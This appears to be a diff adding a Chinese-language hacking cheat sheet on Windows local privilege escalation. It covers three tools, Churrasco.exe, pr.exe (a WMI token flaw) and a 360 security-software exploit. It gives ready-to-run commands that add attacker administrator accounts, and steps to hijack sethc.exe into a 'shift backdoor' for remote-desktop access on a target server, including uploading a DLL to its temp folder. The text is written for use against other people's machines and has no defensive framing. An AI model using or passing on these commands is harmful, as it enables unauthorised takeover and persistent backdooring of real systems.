@@ -1,0 +1,39 @@
+1.Churrasco.exe,是win2003 系统下的一个本地提权0day，通过此工具执行命令即可添加管理用户。
+
+使用方法：
+
+Churrasco.exe "net user hackqing 5427518 /add && net localgroup administrators hackqing /add"
+
+ 
+
+2.pr.exe 提权Windows跟踪注册表项的ACL权限提升漏洞
+Windows管理规范（WMI）提供程序没有正确地隔离NetworkService或LocalService帐号下运行的进程，同一帐号下运行的两个独立进程可以完全访问对方的文件句柄、注册表项等资源。WMI提供程序主机进程在某些情况下会持有SYSTEM令牌，如果攻击者可以以 NetworkService或LocalService帐号访问计算机，攻击者就可以执行代码探索SYSTEM令牌的WMI提供程序主机进程。一旦找到了SYSTEM令牌，就可以获得SYSTEM级的权限提升。
+
+使用方法:
+
+pr.exe “gets.exe $local”
+
+pr.exe “net user admin admin /add & net localgroup administrators admin /add”
+
+
+
+3.360提权
+
+360本地提权漏洞利用工具 　
+
+
+360.exe 要劫持的程序名 要运行的程序全路径 [BREGDLL.dll的全路径]
+
+解释一下吧：第三个参数BREGDLL.dll是可选参数，提供BREGDLL.dll这个文件的路径。因为有时候虽然漏洞没有被补上但360目录没有权限访问会导致提权失败。这时候就可以上传一个BREGDLL.dll到服务器上，然后把路径填到第三个参数那里。
+
+比如对方开了3389，那你就可以劫持sethc.exe 来做一个shift后门。
+
+360.exe "sethc.exe" "cmd.exe"
+
+如果360所在目录无权访问，那么我们就上传一个BREGDLL.dll到对方c:\windows\temp\BREGDLL.dll
+
+然后执行
+
+360.exe "sethc.exe" "cmd.exe" "c:\windows\temp\BREGDLL.dll"
+
+如果提示成功一个shift后门就被创建了，3389上去我就不说了
